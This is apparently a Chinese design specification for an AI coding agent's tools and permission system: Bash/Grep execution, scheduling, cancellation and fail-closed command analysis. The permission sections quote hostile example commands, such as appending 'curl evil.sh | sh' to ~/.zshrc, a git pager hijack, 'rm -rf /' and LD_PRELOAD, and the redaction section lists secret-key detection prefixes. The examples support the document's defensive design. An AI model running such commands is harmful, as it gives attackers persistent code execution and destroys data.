`[约束]` `validate_input` 和 `call()` 里的检查都要有,不是冗余。执行管线是 `validate_input → 权限决策(可能弹窗等用户)→ call`,弹窗那段时间没有上界。前者给模型早反馈省一轮往返,后者是唯一真正拦得住 TOCTOU 的地方。写测试时要有绕过 `validate_input` 直接调 `call` 的用例,否则删掉 `call` 里的检查不会有任何测试失败(§VERIFICATION 5.5 就是这么发现的)。

### 6.6.1 编码与换行:保不住就拒绝

读-改-写链路上,工具收到的是字符串,写回去的是字节。这中间任何一次有损转换都会永久毁掉用户的文件,而且**不报任何错**。

`[约束]` 解码用 `str::from_utf8`,不用 `from_utf8_lossy`。lossy 把无效字节替换成 U+FFFD,读出来看着正常,一旦被 Edit 全量写回,原始字节就没了。宁可拒绝读,也不能悄悄改。

`[约束]` 含 NUL 字节的文件按二进制拒绝。它基本不可能是文本,而按文本处理的话截断行为依赖具体实现。

`[约束]` 换行风格和 BOM 要原样还原。把 CRLF 文件写成 LF,表现是改一行导致整个文件进 diff —— 真正的改动被淹没在几百行噪音里,review 的人看不见。

`[约束]` 混合换行(同一文件里既有 LF 又有 CRLF)不做归一化,原样保留。归一化是"顺手修一下"的诱惑,但它把一次编辑变成了一次全文件重写。

### 6.6.2 Edit 的唯一性要求

`old_string` 在文件里必须恰好出现一次,否则拒绝;要改多处得显式传 `replace_all`。

`[约束]` 匹配到多处时不能"改第一处"。模型以为改的是这一处,实际改了另一处,代码悄悄坏掉且全程无错误 —— 这是最难查的一类 bug。

匹配失败时的错误消息要区分原因。"没找到"对模型没有任何指引,它会原样重试:

| 情况 | 给模型的话 |
|------|-----------|
| `old_string` 带行号前缀 | 指出 Read 的行号是显示用的,不是文件内容 |
| trim 后能匹配上 | 指出是缩进或行尾空白对不上 |
| 只有换行风格不同 | 指出文件用的是 CRLF |
| 匹配到多处 | 给出出现次数,建议扩大上下文或用 `replace_all` |

`[约束]` 拒绝的**理由**要精确,不能只表达"拒绝了"。"文件被改了"和"你还没读过"对模型是两条完全不同的指令 —— 前者让它重读确认,后者让它先读。给错了它会空转一轮。

### 6.7 结果体积的多层防线

| 层 | 机制 | 参数 |
|----|------|------|
| 工具自限 | Read 超行数/字节上限直接 `Failed`,逼模型缩小范围 | 2000 行 / 256KB |
| 单结果落盘 | 超 `max_result_size_chars` → 写文件,模型收到路径 + 前 2KB 预览 | 50k 字符 |
| 单消息聚合 | 并行 N 个工具结果合计超限 → 按 tool_use_id 稳定替换 | 200k 字符 |
| 历史清理 | 旧轮次结果被 microcompact 清成占位符 | 见 §10 |

`[约束]` Read 工具的 `max_result_size_chars` 必须是 `ResultBudget::Unlimited`。否则会产生"Read → 结果落盘成文件 → 模型又去 Read 那个文件"的循环。

`[约束]` 空结果必须替换成 `(<ToolName> completed with no output)`。部分模型见到空 tool_result 会误判任务结束。

### 6.7.1 出口凭证遮蔽

工具结果发给模型前,高置信度的密钥特征(PEM 私钥块、AKIA/ASIA、gh*_、sk- 长 key、Stripe/Slack/Google 前缀)被换成 `[已遮蔽:<种类>]` 占位符,末尾附一句给模型的说明(不说明它会换个工具重试)。实现在 `riot-tools/src/redact.rs`。

`[约束]` 收口在调度器的 `split_outcome`(Ok / Failed 的文本都过),不散到各工具 —— 新接的工具(含 MCP)自动被覆盖,忘不掉。

三条刻意的边界:
- 只遮**模型自主读到的**。用户 `@` 引用、粘贴进输入框的内容不动 —— 那是他明确的选择;
- 只认**厂商前缀的高置信度特征**,不做熵检测/JWT —— 开发场景遍地长随机串,误报几次这层就会被要求加开关,而窄而准的层不需要开关;
- UiPayload 不经过遮蔽,界面照常显示原文 —— 对用户遮他自己的文件毫无意义。

这层是 §9.2.3 凭证**路径**检查的内容侧兜底:改名成 `notes.txt` 的私钥、被 `cat` 进日志的 token、网页里泄漏的 key,路径检查都看不见。

### 6.8 子进程类工具

#### 6.8.1 Bash:一次性执行,不是持久 shell

每次调用起一个新的 `bash -c`,`cd` 不跨调用生效。

代价是模型会写出 `cd foo` 然后下一条命令找不到文件,所以 prompt 里必须**明确写出这一点**。换来的是:没有跨调用的隐藏状态。持久 shell 的环境变量、`set -e`、后台任务、被 `cd` 到某个已删除目录——这些状态对模型不可见,却会让同一条命令在不同时刻有不同结果,而模型没有任何办法观测或复位。

`[约束]` 用 `bash -c`,**不要加 `-l` 或 `-i`**。登录/交互 shell 会读用户的 rc 文件,那里的 alias 和 shell 函数会让同一条命令在不同机器上做不同的事,而模型看不到那些配置。"让 alias 生效"听起来是便利,实际是把不可观测的状态引进了执行环境。

`[约束]` Windows 上**不能把 `bash` 交给 PATH 解析**。只要启用过 WSL 功能,`C:\Windows\System32\bash.exe` 就在 PATH 里而且排得很前——那是 WSL 的启动器,不是 bash。它会进到 Linux 那侧的文件系统里执行,工作目录 `D:\…` 在那边并不存在,报出来的是 `execvpe(/bin/bash) failed: No such file or directory`:看着像"没装 bash",实际是"找错了 bash",于是 Bash 工具在 Windows 上整个不可用。

查找顺序:`RIOT_BASH`(逃生舱)→ 顺着 PATH 里的 `git.exe` 反推 Git for Windows 的 `<root>\bin\bash.exe` → 常见安装位置 → PATH 里其它 bash(**跳过 System32**)。反推 git 比猜安装目录准——用户可能装在别的盘;而装了 git 就有 bash,这个应用本来就依赖 git。

`[约束]` 必须注入非交互环境变量。agent 执行 shell 最常见的挂死原因是交互式命令:`git commit`(无 `-m`)开编辑器,`git log` 开分页器,两者都在等一个永远不会来的按键。

| 变量 | 值 | 挡住什么 |
|------|----|---------|
| `GIT_EDITOR` / `EDITOR` / `VISUAL` | `true` | 编辑器等待保存退出 |
| `GIT_PAGER` / `PAGER` | `cat` | 分页器等待翻页按键 |
| `NO_COLOR` | `1` | ANSI 转义序列(对模型是纯噪音,还占 token) |
| `GIT_TERMINAL_PROMPT` | `0` | git 去开 `/dev/tty` 要用户名（无 TTY 时报 Device not configured） |
| `SSH_ASKPASS_REQUIRE` | `force` | OpenSSH 在无 TTY 时改走 `SSH_ASKPASS`，而不是挂死 |

`GIT_ASKPASS` / `SSH_ASKPASS` 由宿主在启动时注入（`gui_env` 吸入登录 shell 的 `SSH_AUTH_SOCK` 等变量，`askpass` 再挂上助手）。助手把提问转到宿主弹窗，和 VS Code Git 扩展同一条路。Bash 工具本身不覆盖这两项 —— 没装助手时 git 立刻失败，不假装能提问。

超时能兜底,但那意味着用户白等两分钟换一个没有信息量的失败。

不注入 `CI=1`。它确实能关掉更多交互,但也会改变被执行命令本身的语义(测试框架在 CI 下行为不同),那超出了"防止挂住"的范围。

`[约束]` 输出截断保留**头和尾**,不能只保开头。命令输出里最有价值的部分通常在末尾:编译器的 `error: aborting due to 3 previous errors`、测试框架的失败汇总、脚本的最后一条日志。只保头部的话模型看到的是一堆编译进度,而真正的错误原因被丢了。

`[约束]` 超时后已产出的输出照样给模型。只说"超时了"等于让它从零开始猜,而超时前的输出往往正好指出卡在哪一步。

`[约束]` 非零退出的措辞要中性。`grep` 没匹配返回 1、`diff` 有差异返回 1,都是正常结果。说成"命令执行失败"会诱导模型去修一个根本没坏的东西。给出退出码和完整输出,让它自己判断。

`[约束]` `is_read_only` 与权限层用同一套判定(`bash::is_read_only`)。两处用不同标准的话,会出现"权限层要求确认、调度器却让它并发跑"这种自相矛盾的状态。解析不出结构时返回 `false`——fail-closed。

#### 6.8.2 Grep:参数走 argv,不拼 shell

底层是 ripgrep。参数通过 `ProcessSpec { program, args }` 传给子进程,**不经过 shell**。

这不是实现细节。它意味着模型给的 pattern 里就算有 `$(...)`、`` ` ``、`;` 也只是普通字符。改成拼 shell 命令的话,每一个搜索词都得先转义一遍,而漏掉一处就是命令注入——搜索词恰恰是最容易包含元字符的输入。

`[约束]` pattern 用 `-e` 传,不做位置参数。以 `-` 开头的搜索词(搜 `--force`)会被 rg 当成 flag 解析,结果不是报错就是激活一个碰巧存在的开关。路径前加 `--` 同理。

`[约束]` 加 `--no-config`。用户的 `RIPGREP_CONFIG_PATH` 里可能有 `--smart-case`、`--hidden`,那会让同一次搜索在不同机器上给出不同结果,而模型和我们都看不到那份配置。

`[约束]` 区分 rg 的退出码 1(无匹配)和 2(出错)。合并的话"没搜到"会被报成搜索失败,模型会去调参数重试——而正确的下一步是换个搜索词或者接受这个结果。无匹配时顺带提醒 gitignore,那是"文件明明在那儿却搜不到"的最常见原因。

搜索根不受项目目录限制（见 §9.5.1）。敏感目标由安全检查那层管——`Grep -l "BEGIN PRIVATE KEY" ~/.ssh` 拦在 §9.4，不在这里。

正则在本地先编译一次再发给 rg。让 rg 去报错的话,模型收到的是一段 regex 内部诊断,而且白等一次进程启动。

---

## 7. 工具调度与并发

### 7.1 并发判定是函数,不是标签

```rust
// 只读工具
impl Tool for ReadTool {
    fn is_concurrency_safe(&self, _: &Value) -> bool { true }
}

// Bash:按命令内容动态判定
impl Tool for BashTool {
    fn is_concurrency_safe(&self, input: &Value) -> bool { self.is_read_only(input) }
    fn is_read_only(&self, input: &Value) -> bool {
        // 命令名 + 显式安全 flag 白名单,见 §9.4
        analyze_command(input).map(|a| a.is_read_only).unwrap_or(false)
    }
}
```

同一个 Bash 工具,`ls -la` 可以和 Read 并行,`rm -rf` 必须独占串行。

### 7.2 分批调度

```
[read A, read B, edit C, read D, read E]
  → 并行批 [read A, read B]
  → 串行批 [edit C]
  → 并行批 [read D, read E]
```

- **连续的**并发安全工具合并成一批并行执行,上限 10;
- 非安全工具单独成批,严格串行;
- schema 解析失败、工具未注册、`is_concurrency_safe` panic → 一律按不安全处理。

`[约束]` fail-closed 的方向在这里很明确:判断不了就串行。代价是慢一点,而反过来(判断不了就并行)的代价是并发写同一个文件。`is_concurrency_safe` 要用 `catch_unwind` 包住——工具是第三方可扩展的(MCP),一个 panic 不该拖垮整批。

`[约束]` 并发上限传 0 时必须夹到 1(退化成全串行),否则并行批永远装不满,循环逻辑会退化。

`[约束]` 分批必须保持模型给出的原始顺序。不允许为了提高并行度而重排(比如把后面的 read 提到 edit 前面)——模型的工具顺序常常隐含依赖。

### 7.3 结果保序输出

并行执行,但**结果按入队顺序 yield**。进度事件可以插队立即 yield。

```rust
// 用 FuturesOrdered 而不是 FuturesUnordered
let mut batch = FuturesOrdered::new();
for tool_use in concurrent_group {
    batch.push_back(execute_one(tool_use, ctx.clone(), cancel.child_token()));
}
while let Some(outcome) = batch.next().await {
    yield AgentEvent::Message(tool_result_message(outcome));
}
```

`[约束]` 用 `FuturesOrdered`。transcript 的消息顺序必须可重放,`FuturesUnordered` 会让顺序依赖调度时序,黄金回放测试就废了。

### 7.4 兄弟错误级联

Bash 工具失败 → 取消同批次所有兄弟。Read / Grep 等失败 → **不**级联。

理由:bash 命令常有隐式依赖(`mkdir foo` 失败后 `cd foo && ...` 无意义),而只读工具彼此独立。

判定走 `Tool::cascades_on_failure()`,默认 `false`。

`[约束]` 这个默认值的方向和其它 fail-closed 默认值**相反**,是刻意的。这里"安全"指的不是少做事:级联会误杀无关工具,用户看到一串"已取消"却不知道为什么;而不级联最多是多跑几个注定失败的命令,那些失败本身是可见的。**误杀比浪费更难排查。**

一开始想用 `interrupt_behavior() == Cancel && !is_read_only(input)` 推导,不行:并行批里全是 `is_concurrency_safe` 的工具,而 Bash 的只读命令(`ls`、`cat`)恰好都满足 `is_read_only`。按那个公式推,并行批里永远不会级联——可是几个并行的 `ls` 之间照样有隐式依赖。级联是**工具语义**,不是输入属性,得单独一个方法。

`[约束]` **级联必须在工具启动前生效,不能是"跑完再丢弃结果"。**后者的副作用照样发生了,只是模型看不到——那比不级联更糟。实现上表现为:`run_one` 在构造 `ToolContext` 之前先查 `cancel.is_cancelled()`。

`[约束]` **被取消的工具不触发级联。**`ToolOutcome::Cancelled` 不算失败。否则一次用户中断会在批次内引发连锁取消,而用户只按了一次停止。

### 7.4.1 兜底:每个 tool_use 恰好一个 tool_result

`[约束]` 这是整个系统里最脆弱的不变量。断了之后下一次 API 请求直接 400,而错误信息不会告诉你是哪个 id 缺了。

调度器里有五条路径能让它断掉,每条都要显式补结果:

| 路径 | 处理 |
|------|------|
| 工具未注册 | 返回带可用工具列表的错误结果,让模型能改 |
| 工具 panic | `catch_unwind` 兜住,转成失败结果 |
| 级联跳过 | 补一条"同批次其它工具失败,已跳过" |
| 用户中断 | 剩余批次**继续遍历**补结果,不能 `break` |
| 取消 | `ToolOutcome::Cancelled` 也要转成 tool_result |

第四条特别容易写错:中断后直觉是跳出循环,但那样后面批次的 `tool_use` 就全成了孤儿。

### 7.5 流式工具执行(阶段 C,先不做)

LLM 还在输出后续内容时,先到达的 `tool_use` 已经开始执行。收益明显但复杂度高(乱序缓冲、级联取消、降级时的孤儿结果清理)。

`[约束]` 第一版**不实现**。但 `execute_tools` 的签名要接受一个 `Stream<Item = ToolUse>` 而不是 `Vec<ToolUse>`,这样以后接流式不用改调用方。

---

## 8. 取消与中断

### 8.1 CancellationToken 分层

```
session_token                          (会话级:关闭窗口)
  └─ query_token                       (一次用户请求:Esc / 新消息打断)
      └─ batch_token                   (一批并行工具:兄弟级联)
          └─ tool_token                (单个工具)
```

`tokio_util::sync::CancellationToken::child_token()` 天然满足"父取消传给子,子取消不上传"的语义。

`[取舍]` 这里 Rust 比 TS 省事。TS 的 `AbortController` 没有内置父子关系,Claude Code 要手写链接逻辑并处理"子 abort 不冒泡但权限拒绝要冒泡"的例外。`CancellationToken` 直接给了这个语义。

### 8.2 中断原因要带语义

```rust
pub struct CancelReason {
    pub source: AbortSource,
    pub detail: Option<String>,
}

pub enum AbortSource {
    /// 用户按 Esc
    User,
    /// 用户中途插话 —— UI 不显示"已中断"文案,
    /// 因为后续排队消息自带上下文
    UserInterjection,
    /// 同批兄弟工具失败
    SiblingFailure,
    /// 权限被拒且需要结束整轮
    PermissionDenied,
    Shutdown,
}
```

`CancellationToken` 本身不带 reason,所以要在旁边放一个 `Arc<OnceLock<CancelReason>>`,取消时先写 reason 再 `cancel()`。

### 8.3 中断后必须补齐 tool_result

`[约束]` **这是最容易漏、后果最严重的一条。**

每个已经发出的 `tool_use` 块都必须有配对的 `tool_result`。中断时要为所有孤儿 `tool_use` 合成 `is_error` 结果:

```rust
fn synthesize_missing_tool_results(state: &AgentState) -> Vec<AgentEvent> {
    orphan_tool_uses(&state.messages)
        .map(|id| AgentEvent::Message(Message::User {
            content: vec![UserContent::ToolResult {
                tool_use_id: id,
                content: ToolResultContent::Text("Interrupted by user".into()),
                is_error: true,
            }],
            ..
        }))
        .collect()
}
```

漏了这一步,下一次 API 调用会因为配对缺失直接 400,而错误信息不会告诉你原因。`docs/VERIFICATION.md` 里有对应的不变量断言。

### 8.4 工具的中断行为

```rust
pub enum InterruptBehavior {
    /// 可以立即取消(Bash、WebFetch)
    Cancel,
    /// 不可中断,让新消息排队等(正在写文件)
    Block,
}
```

### 8.5 中断的收尾:半截回答定稿,什么都没产出就把提问退回输入框

用户按停止时模型往往还没给出任何**留得下**的东西——等首字、等它想完的那几秒正是最容易反悔的时候(发现打错了、想补一句)。这一轮结束后,内核检查两件事:取消**是用户按的**(关窗口/退应用的取消不算),且这一轮没有过任何 `Message`。两者都成立就把轮首追加的那条用户消息撤回:内存历史 pop,transcript 追加一条 `Record::Withdraw`,并在 `Done` 之前发 `AgentEvent::PromptWithdrawn`。

`[约束]` 只删不够,必须落一条撤回记录。只改内存的话,重启水合会把它读回来——用户会看到一条自己明明取消过、还拿回输入框改过的消息又躺在对话里。

`[约束]` 判据是"有没有产出",不是终止原因。取消发生在等首字期间时,provider 直接结束流、主循环走的是正常收尾那条路,`TerminalReason` 是 `Completed` 而不是 `Aborted`——按原因判会漏掉最常见的那一半。

`[约束]` 判据只认 `Message`,`Delta` 不算(`leaves_a_trace`)。取消时 provider 直接结束流、不会有定稿消息,那些增量哪里都没留下;界面收到 `Done` 也把 `streaming`/`thinking` 清空。拿一个转瞬即逝的东西当"有产出"的凭据,用户看到的是:思考没了,而自己那句提问孤零零留在对话里等一个不会来的回答——这正是最早那版(`Delta` 也算产出)在真机上的表现。

为什么不留着那条消息:它从没被回答过,留在历史里下一轮会原样再发给模型一次,而用户以为自己已经取消了它。反过来,只要有一条 `Message` 落了地(哪怕是被取消的工具补齐的那条结果),提问就必须留下——撤掉它会在上下文里留下一个悬空的回答。`withdraw_prompt` 自己也守着这条:历史末尾不是那条提问就拒绝撤回。

**已经说出口的半截话要留下。** 按停止常常是"够了,别说了",不是"当你没说过"——所以 `Done` 到达时先走 `finalize_partial`:半截流缓冲里还有正文的话,就地定稿成一条 `MessageMeta::interrupted` 的助手消息,进历史、进 transcript、发一条 `Message` 事件给界面(界面标"已停止生成")。它排在撤回判定**之前**,一旦落地这一轮就算有产出,提问不再撤回。

`[约束]` 思考不定稿。它没有签名,回喂给模型是错的(见 INV-9 的降级剥离规则),而单独留一段没有结论的推理对用户也没有价值。所以"只思考过就被停"仍然走撤回那条路。

---

## 9. 权限系统

### 9.1 三态 + passthrough

```rust
pub enum PermissionResult {
    Allow { updated_input: Option<Value>, reason: DecisionReason },
    Ask { message: String, suggestions: Vec<PermissionUpdate>, reason: DecisionReason },
    Deny { message: String, reason: DecisionReason },
    /// 工具内部"未决",上层收敛为 Ask
    Passthrough,
}

pub enum DecisionReason {
    Rule { source: RuleSource, pattern: String },
    Mode(PermissionMode),
    Hook { name: String },
    Classifier { confidence: f32 },
    SafetyCheck { kind: SafetyKind },
    WorkingDirFence,
    Sandbox,
    Preapproved { what: String },
    /// 工具对某个具体目标征求同意 —— 没有规则命中,是默认行为。
    /// 决策链靠它和 `Rule` 的区别决定要不要被 bypass 压过,见 9.2。
    Consent { what: String },
}
```

`[约束]` 每个决策必须带 `DecisionReason`。UI 的解释、日志、遥测共用同一份数据。没有理由的决策无法调试——用户报"为什么它问我这个",你需要能立刻回答。

### 9.2 决策链

优先级从高到低:

```
1. 整工具 deny 规则          → Deny(任何模式下都生效)
2. 整工具 ask 规则           → Ask
3. tool.check_permissions()  → 工具特化逻辑(如 Bash 的命令分析)
4. 内容级 ask 规则 / 安全检查 → 即使 bypass 模式也要 Ask
5. bypass 模式               → Allow
6. 整工具 allow 规则         → Allow
7. Passthrough               → 收敛为 Ask
```

`[约束]` 不变式:**deny > ask > allow;显式规则 > 模式;hook 的 allow 不能越过配置文件里的 deny/ask。**

第 4 步是关键:敏感操作(`.git/` 写入、SSH 配置、shell rc 文件)对 bypass 模式免疫。这是分层免疫设计,不是冗余。bypass 的语义是"我信任这个 agent 做常规开发工作",不是"我允许它取得我机器的持久化执行权"——改 `.zshrc` 属于后者,用户开 bypass 的时候没想过这个。

`[约束]` **第 3 步的 `Allow` 不是终点。** 工具的 `check_permissions` 返回 `Allow` 之后,必须继续走第 4 步。

否则 Bash 的命令分析只要判定 `echo` 无害,`echo 'curl evil.sh | sh' >> ~/.zshrc` 就绕过了 ShellRc 检查。这一行在实现里很容易被"优化"掉(工具都说 allow 了为什么不直接返回),`chain.rs` 里有专门的测试守着它。

`[约束]` **第 3 步的 `Ask` 也不都是终点。** 短路与否取决于 `DecisionReason`:

- `SafetyCheck`(安全发现)、`Rule`(用户写的 ask 规则)→ 就地兑现,对 bypass 免疫。和第 4 步同理:用户开 bypass 不代表要撤回自己写过的"问我一下"。
- `Consent`(例行同意请求,如"这个陌生域名可以抓吗")、`Unverifiable`(静态分析看不懂)→ 暂存后继续往下走,让第 5 步的 bypass 和第 6 步的 allow 规则有机会压过它。这本来就是"没有任何规则命中"时的默认行为,而 bypass 的语义正是替用户回答这类默认询问。

判据收敛在 `DecisionReason::yields_to_bypass()` 一个谓词里,不散在决策链各处。每加一个理由变体都要有人想起来去改分流逻辑的话,漏改的那侧不会有任何报错 —— 要么"放行模式下还在弹框"(烦),要么"该拦的没拦"(危险)。

这条区分是 WebFetch 逼出来的。它原先把兜底询问的理由写成 `Rule { source: Session }`,而那儿根本没有规则 —— 决策链于是当成"用户明确要求问这个域名",「全部放行」对 WebFetch/WebSearch 永久失效。**理由字段不是给日志看的装饰,决策链靠它分流。**

`[约束]` 暂存的 `Consent` 必须在第 7 步的 `mode_default` **之前**兑现。WebFetch 的 `is_read_only()` 是 `true`,而 `mode_default` 对只读工具一律放行 —— 少了那道提前返回,所有抓取会在每个模式下被静默放行,比"老是弹框"严重得多且无任何报错。

### 9.2.0 不确定性不是危险

`[约束]` Bash 命令分析产出的 `Ask` 分两档,分档标准是**分析器确实发现了危险**,还是**它只是不敢断言**:

| 判定 | `DecisionReason` | 对 bypass | 例子 |
|------|------------------|-----------|------|
| 看不懂 | `Unverifiable` | 让步 | `echo $HOME`、`$(git rev-parse HEAD)`、`for` 循环、`cargo test > /tmp/out.log` |
| 确实危险 | `SafetyCheck` | 免疫 | `eval "$CMD"`、`LD_PRELOAD=`、`echo x >> ~/.zshrc` |

两档混为一谈的后果是**行为倒置**:第二档在正常开发里几乎不出现,第一档遍地都是(模型干活必然用变量和管道)。全标成安全发现的话,「全部放行」变成一个 `echo $HOME` 都跑不过去的模式,而同一时刻 `rm -rf node_modules` 却静默放行 —— 用户看到的是"越放行越难用"。

`[约束]` **危险判定不能被无害判定掩护。** 语法树从前往后扫,`eval "$CMD"` 里先遇到的是可放行的变量展开,`eval` 在它后面。扫描一遇到"看不懂"就返回的话,那个可被压过的判定会把不可压过的判定整个挡住。所以 `scan_forbidden` 对"看不懂"只记第一个并继续扫完全树,只有危险的才立即返回。同理,即使扫描阶段已经看不懂,也仍要走一遍子命令提取 —— `eval` / `source` 是在那一步按命令名认出来的。

`[约束]` **重定向必须按目标路径分级。** Bash 的 `target_path()` 返回 `None`,通用路径安全检查(§9.3)**对 Bash 完全不生效** —— `echo evil >> ~/.zshrc` 里那个 `~/.zshrc` 除了 `bash::ast::redirect_target_risk` 没有第二处看得见。放宽重定向时若不按目标分级,持久化执行权就跟着敞开了。行为表见 `crates/riot-tools/tests/bypass_behavior.rs`。

### 9.2.0.1 无人值守模式

`unattended` 是唯一连 `SafetyCheck` 一起放行的模式,给的是"挂机跑长任务、没人在场回答弹窗"的场景。

`[约束]` `unattended` **压不过用户写死的 deny 规则**。"别问了"不等于"我之前写的禁令作废"。

`[约束]` `unattended` 和 `can_prompt_user == false` 是两回事,不能合并。后者是"没有 UI,问不出去",只能收敛为 deny(见 §9.2.1);前者是"用户在场、看过警告、亲手选的",才可以放行。混为一谈等于给异步子 agent 开后门。

界面上这个模式要求二次确认,选中后卡片带"高风险"标记。

### 9.2.1 ask 的收敛方向

`[约束]` `dontAsk` 模式和 `can_prompt_user == false`(异步子 agent 没有 UI)时,ask **收敛为 deny**。

绝对不能收敛为 allow。"没人能回答"不等于"默认同意"——那会让无人值守场景成为绕过所有权限的后门。

### 9.2.2 严格性优先于来源优先级

`[约束]` `RuleSource` 的优先级决定"同一个决策取哪条规则作为理由",**不决定"deny 和 allow 谁赢"**。跨来源时永远是 deny > ask > allow。

搞反的后果:组织策略里的一条 `allow` 会让用户无法在自己的机器上收紧权限。策略应该能强制放宽下限,但不该阻止用户自愿更严格。

### 9.2.3 只读操作不触发非凭证类安全检查

读 `.zshrc` 不会让 agent 获得执行权,把读也拦下来只会让"看一眼配置"这种正常需求变得很烦。

凭证文件是例外——`.env`、SSH 私钥、AWS credentials 读到就是泄露,读写都拦。路径名单认不出的(改过名的私钥、日志里的 token)由出口凭证遮蔽兜底,见 §6.7.1。

同理,敏感路径按**路径分量**匹配,不是子串:用子串的话 `src/legit.git-helper.rs` 会被误判成 `.git` 写入。误报比漏报更快消耗掉用户的注意力——弹窗多了他就不看内容直接点允许,那时候真正危险的操作也一起放行了。

### 9.3 Bash 命令分析:fail-closed AST

```
命令 → tree-sitter-bash 解析
  ├─ Simple:所有 AST 节点都在白名单里 → 拆成子命令逐个跑决策链
  ├─ TooComplex:出现不认识的结构 → 直接 Ask
  └─ ParseFailed → 降级到 shell-words 分词 + 注入检测正则 → 倾向 Ask
```

`[约束]` **只允许明确白名单的 AST 节点。凡是不理解的结构,不假装能证明它安全,直接问人。**

方向很重要:白名单是"哪些节点允许出现",不是"哪些节点要拦"。bash 的 grammar 有一百多种节点,而且会随 tree-sitter-bash 升级增加——黑名单漏掉一种新节点的表现是**静默放行**。

Rust 这里有生态优势:`tree-sitter` 和 `tree-sitter-bash` 都是原生 crate,不需要 WASM 或 Node 绑定。

#### 白名单要基于 grammar 的实际产出

`[约束]` 每一条白名单都要从 tree-sitter-bash 的真实输出里读出来,不能照着 bash 手册想。有三个地方反直觉,照手册写必错:

- **`ls &` 里的 `&` 是匿名节点。** 只遍历 named 节点的话,后台执行和普通执行的语法树完全一样。遍历必须包含匿名节点。
- **`;` 和换行分隔的命令不产生包装节点**,直接挂在 `program` 下面。只处理 `list` 节点会漏掉 `ls; rm -rf /`。
- **`git commit -m 'msg with && inside'` 里的 `&&` 在 `raw_string` 内**,AST 不把它当命令分隔符。这正是用 AST 而不是正则拆分的全部理由。

#### 子命令提取要宽松,禁止扫描要严格

这两步的失效方向相反,所以写法也相反:

- `scan_forbidden` 遍历全树,任何不在白名单里的节点立即终止 → **严格**;
- `collect_commands` 不限定父节点类型,能找到的 `command` 全都收 → **宽松**。

当前白名单下 `command` 只可能挂在 `program`/`list`/`pipeline` 底下,两种遍历行为一样。但宽松遍历在扫描漏掉某个容器时会多找到命令(多检查一遍,安全),严格遍历会直接漏掉它们(不检查,放行)。

#### 安全包装的剥离要精确

剥掉 `timeout 30` 是为了让规则匹配到真正执行的命令,否则用户得为 `npm test`、`timeout 30 npm test`、`nice npm test` 各写一遍规则。

`[约束]` 每个包装器必须精确声明自己的参数形态(哪些 flag 带值、有几个位置参数)。含糊的"跳过前导 flag"会剥错:`timeout -k 5 30 npm test` 里 `5` 是 `-k` 的值、`30` 才是时长,粗略跳过会把命令名认成 `30`。剥错的后果不是报错,是规则匹配到一条不存在的命令,然后静默走错分支。

形态对不上时**不剥**,保留原样走询问流程。

`[约束]` `sudo` 不是安全包装。它改变的是权限,剥掉之后 `Bash(rm /tmp/*)` 会放行 `sudo rm /tmp/*`。

#### 规则匹配分两种模式

`[约束]` 规则通配符默认不跨 shell 元字符(§9.3.1),但对**已经过 AST 验证的单条命令**要放宽。

原因是元字符限制的目的是防御"没有 AST 拆分就整串匹配"。AST 拆分之后,能出现在子命令文本里的 `&&` 和 `$` 只可能是引号内的字面量——这时限制只剩误伤,`git commit -m 'fix $HOME handling'` 会每次都要求重新授权。

两种模式在代码里是 `MatchMode::Raw` 和 `MatchMode::AstVerified`,默认值是严格的那个。

配套:

- 子命令逐条检查,任一 deny → 整命令 deny;任一 ask → ask;全 allow 才 allow;
- 子命令数上限 50(防 ReDoS);
- 注入检测:`$()`、反引号、`<()`、`${}`、IFS 注入、Unicode 空白;
- 匹配规则前剥掉安全包装(`timeout 30`、`nice`),但**不剥** `LD_PRELOAD` / `PATH` 这类危险环境变量。

### 9.3.1 规则通配符不跨 shell 元字符

`[约束]` 规则模式里的 `*` 不匹配 `&`、`;`、`|`、`` ` ``、`$`、`<`、`>`、`()`、换行。

正常路径上命令会先被拆成子命令再逐个匹配,所以 `npm run test && rm -rf /` 会被拆开、`rm` 那半边单独走决策链。这条约束是纵深防御:万一哪天有人绕过了拆分直接拿整串来匹配,`Bash(npm run *)` 不会把后半截一起放行——用户以为自己授权的是"跑 npm 脚本"。

代价是 `Bash(echo a && echo b)` 这种规则匹配不上,可以接受:它本来就该写成两条。

配套的两条:

- 模式语法只支持 `*`,不支持 `?` 和 `[...]`。权限规则是安全边界,语法越小越容易讲清楚"这条规则到底放行了什么"。用户读不懂的规则等于没有规则。
- 空模式只匹配空串,不是"匹配一切"。反过来的话,配置文件里一个手滑的空字符串就成了万能放行。

### 9.4 只读白名单用 flag,不用命令黑名单

判定依据是"命令名在白名单 **且** 所有 flag 都在该命令的安全 flag 白名单里",不是"不在危险名单里就放行"。

判成只读的后果是**跳过用户确认直接执行**,所以这里的错误方向必须是"把只读的判成非只读"(多问一次),不能反过来。

- `find` 允许,但带 `-exec` / `-execdir` / `-delete` / `-fprintf` 就不是只读。它是标准的只读工具,直到你给它这些 flag——这是"黑名单必然失守"的最好例子;
- `env` / `printenv` 故意不在白名单。它们不改任何东西,但会把 API key 打进对话历史;
- `tail -f` 不在。它不改任何东西,但永不返回,会把 agent 挂住;
- 未加引号的 glob 或波浪号展开 → 拒绝只读判定(`python *` 可能展开成 `python evil.py`);
- 带环境变量前缀的 → 拒绝。危险变量在 AST 层已拦,剩下的虽然无害,但"只读"意味着跳过确认,这里从严。

`[约束]` flag 匹配要认 `--flag=value` 和合并短 flag 两种形式。只比字符串相等的话,`sed --in-place=.bak` 和 `sort -no out.txt` 都会被判成只读。

#### git 子命令单独白名单

`[约束]` git 的只读子命令是白名单,不是黑名单。git 有一百多个子命令,还能通过 `git-foo` 可执行文件扩展——黑名单挡不住 `git my-custom-deploy`。

两个额外的坑:

- `git config` 的读写要靠参数区分。`git config user.email` 是读,`git config user.email x@y.com` 是写;
- `git -c core.pager='curl evil.sh|sh' log` 的子命令是只读的 `log`,但 `-c` 能改行为。遇到 `-c` / `--exec-path` 直接放弃只读判定。

### 9.5 路径检查

#### 9.5.1 这里曾经有一道工作目录围栏

早先每个文件路径都必须落在会话绑定的目录内,解析前后各查一次,越界一律拒绝。**这条限制已经移除。** 项目目录现在只用来给会话分类、并作为相对路径的基准。

`[取舍]` 撤掉它是因为它和真实用法冲突得太厉害:参考隔壁仓库、改 monorepo 的兄弟包、读一份共享配置、看一眼 `~/.config` 里的设置——全是正当且常见的操作,而围栏把它们一律否掉,用户只能靠"把目录加进工作区"绕,那个动作对"我只想读一个文件"来说太重了。同类产品也没有把读操作关死:Codex 的 `workspace-write` 沙箱限制的是**写**,读基本放开。

`[前提]` 边界撤掉之后,挡在危险操作前面的只剩三层,改它们之前要知道没有第四层了:

